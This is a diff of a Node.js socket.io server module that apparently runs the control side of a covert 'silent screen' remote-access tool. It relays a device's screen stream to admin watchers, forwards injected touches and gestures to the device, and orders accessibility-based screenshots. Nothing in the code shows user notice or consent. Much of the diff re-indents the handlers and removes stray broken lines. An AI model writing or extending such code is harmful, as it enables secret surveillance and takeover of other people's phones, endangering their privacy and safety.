@@ -135,125 +135,120 @@ function setupSilentStreamHandlers(io, socket) {
             ...treeData
         });
     });
-    packageName,
-        nodes,
-            ...treeData
-});
-    });
 
-/**
+    /**
  * Status update from device
  */
-socket.on('silent-screen:status', (data) => {
-    const deviceId = getDeviceIdFromSocket(socket);
-    if (!deviceId) return;
+    socket.on('silent-screen:status', (data) => {
+        const deviceId = getDeviceIdFromSocket(socket);
+        if (!deviceId) return;
 
-    console.log(`[SILENT] Status from ${deviceId}: ${data.status}`);
+        console.log(`[SILENT] Status from ${deviceId}: ${data.status}`);
 
-    if (data.status === 'started') {
-        activeSilentStreams.set(deviceId, {
-            startTime: Date.now(),
-            screenWidth: data.screenWidth,
-            screenHeight: data.screenHeight
+        if (data.status === 'started') {
+            activeSilentStreams.set(deviceId, {
+                startTime: Date.now(),
+                screenWidth: data.screenWidth,
+                screenHeight: data.screenHeight
+            });
+            io.to(`silent-stream:${deviceId}`).emit('silent-screen:started', {
+                deviceId,
+                screenWidth: data.screenWidth,
+                screenHeight: data.screenHeight
+            });
+        } else if (data.status === 'stopped') {
+            activeSilentStreams.delete(deviceId);
+            io.to(`silent-stream:${deviceId}`).emit('silent-screen:stopped', { deviceId });
+        }
+    });
+
+    /**
+     * Remote touch from admin - forward to device (legacy)
+     */
+    socket.on('silent-screen:touch', (data) => {
+        const { deviceId, ...touchData } = data;
+        if (!deviceId) return;
+
+        console.log(`[SILENT] Touch for ${deviceId}: ${touchData.type} at (${touchData.x}, ${touchData.y})`);
+
+        // Forward to device for gesture injection
+        io.to(`device:${deviceId}`).emit('remote:touch', touchData);
+    });
+
+    /**
+     * Advanced gestures from admin - forward to device
+     * Supports: tap, longpress, swipe, double_tap, drag, doodle
+     */
+    socket.on('silent-screen:gesture', (data) => {
+        const { deviceId, ...gestureData } = data;
+        if (!deviceId) return;
+
+        console.log(`[SILENT] Gesture for ${deviceId}: ${gestureData.type}`, {
+            start: `(${gestureData.startX?.toFixed(3)}, ${gestureData.startY?.toFixed(3)})`,
+            end: gestureData.endX ? `(${gestureData.endX?.toFixed(3)}, ${gestureData.endY?.toFixed(3)})` : 'N/A',
+            direction: gestureData.direction || 'N/A'
         });
-        io.to(`silent-stream:${deviceId}`).emit('silent-screen:started', {
+
+        // Forward to device for gesture injection
+        io.to(`device:${deviceId}`).emit('remote:gesture', gestureData);
+    });
+
+    /**
+     * Admin requests a screenshot for background rendering
+     */
+    socket.on('silent-screen:capture-background', ({ deviceId }) => {
+        if (!deviceId) return;
+
+        console.log(`[SILENT] Background screenshot request for: ${deviceId}`);
+
+        // Send command to device to capture a screenshot
+        io.to(`device:${deviceId}`).emit('command:execute', {
+            id: `silent-screenshot-${Date.now()}`,
+            type: 'capture_accessibility_screenshot',
+            payload: {}
+        });
+    });
+
+    /**
+     * Screenshot data from device - forward to requesting admin
+     */
+    socket.on('silent-screen:screenshot-data', (data) => {
+        const deviceId = getDeviceIdFromSocket(socket);
+        if (!deviceId) return;
+
+        console.log(`[SILENT] Screenshot received from ${deviceId}, size: ${data.imageData?.length || 0} bytes`);
+
+        // Forward to all watchers of this device
+        io.to(`silent-stream:${deviceId}`).emit('silent-screen:screenshot', {
             deviceId,
-            screenWidth: data.screenWidth,
-            screenHeight: data.screenHeight
+            imageData: data.imageData
         });
-    } else if (data.status === 'stopped') {
-        activeSilentStreams.delete(deviceId);
-        io.to(`silent-stream:${deviceId}`).emit('silent-screen:stopped', { deviceId });
-    }
-});
-
-/**
- * Remote touch from admin - forward to device (legacy)
- */
-socket.on('silent-screen:touch', (data) => {
-    const { deviceId, ...touchData } = data;
-    if (!deviceId) return;
-
-    console.log(`[SILENT] Touch for ${deviceId}: ${touchData.type} at (${touchData.x}, ${touchData.y})`);
-
-    // Forward to device for gesture injection
-    io.to(`device:${deviceId}`).emit('remote:touch', touchData);
-});
-
-/**
- * Advanced gestures from admin - forward to device
- * Supports: tap, longpress, swipe, double_tap, drag, doodle
- */
-socket.on('silent-screen:gesture', (data) => {
-    const { deviceId, ...gestureData } = data;
-    if (!deviceId) return;
-
-    console.log(`[SILENT] Gesture for ${deviceId}: ${gestureData.type}`, {
-        start: `(${gestureData.startX?.toFixed(3)}, ${gestureData.startY?.toFixed(3)})`,
-        end: gestureData.endX ? `(${gestureData.endX?.toFixed(3)}, ${gestureData.endY?.toFixed(3)})` : 'N/A',
-        direction: gestureData.direction || 'N/A'
     });
 
-    // Forward to device for gesture injection
-    io.to(`device:${deviceId}`).emit('remote:gesture', gestureData);
-});
+    /**
+     * Handle socket disconnect - cleanup watchers
+     */
+    socket.on('disconnect', () => {
+        // Remove from all silent stream watcher lists
+        for (const [watchedDeviceId, watchers] of silentStreamWatchers.entries()) {
+            if (watchers.has(socket.id)) {
+                watchers.delete(socket.id);
+                console.log(`[SILENT] Watcher disconnected from ${watchedDeviceId}`);
 
-/**
- * Admin requests a screenshot for background rendering
- */
-socket.on('silent-screen:capture-background', ({ deviceId }) => {
-    if (!deviceId) return;
-
-    console.log(`[SILENT] Background screenshot request for: ${deviceId}`);
-
-    // Send command to device to capture a screenshot
-    io.to(`device:${deviceId}`).emit('command:execute', {
-        id: `silent-screenshot-${Date.now()}`,
-        type: 'capture_accessibility_screenshot',
-        payload: {}
-    });
-});
-
-/**
- * Screenshot data from device - forward to requesting admin
- */
-socket.on('silent-screen:screenshot-data', (data) => {
-    const deviceId = getDeviceIdFromSocket(socket);
-    if (!deviceId) return;
-
-    console.log(`[SILENT] Screenshot received from ${deviceId}, size: ${data.imageData?.length || 0} bytes`);
-
-    // Forward to all watchers of this device
-    io.to(`silent-stream:${deviceId}`).emit('silent-screen:screenshot', {
-        deviceId,
-        imageData: data.imageData
-    });
-});
-
-/**
- * Handle socket disconnect - cleanup watchers
- */
-socket.on('disconnect', () => {
-    // Remove from all silent stream watcher lists
-    for (const [watchedDeviceId, watchers] of silentStreamWatchers.entries()) {
-        if (watchers.has(socket.id)) {
-            watchers.delete(socket.id);
-            console.log(`[SILENT] Watcher disconnected from ${watchedDeviceId}`);
-
-            // If no more watchers, stop the stream
-            if (watchers.size === 0) {
-                console.log(`[SILENT] No watchers left - stopping: ${watchedDeviceId}`);
-                io.to(`device:${watchedDeviceId}`).emit('command:execute', {
-                    id: `silent-stop-${Date.now()}`,
-                    type: 'stop_silent_screen',
-                    payload: {}
-                });
-                activeSilentStreams.delete(watchedDeviceId);
-                silentStreamWatchers.delete(watchedDeviceId);
+                // If no more watchers, stop the stream
+                if (watchers.size === 0) {
+                    console.log(`[SILENT] No watchers left - stopping: ${watchedDeviceId}`);
+                    io.to(`device:${watchedDeviceId}`).emit('command:execute', {
+                        id: `silent-stop-${Date.now()}`,
+                        type: 'stop_silent_screen',
+                        payload: {}
+                    });
+                    activeSilentStreams.delete(watchedDeviceId);
+                    silentStreamWatchers.delete(watchedDeviceId);
+                }
             }
         }
-    }
-});
+    });
 }
 
 // Helper to get device ID from socket (using shared state)
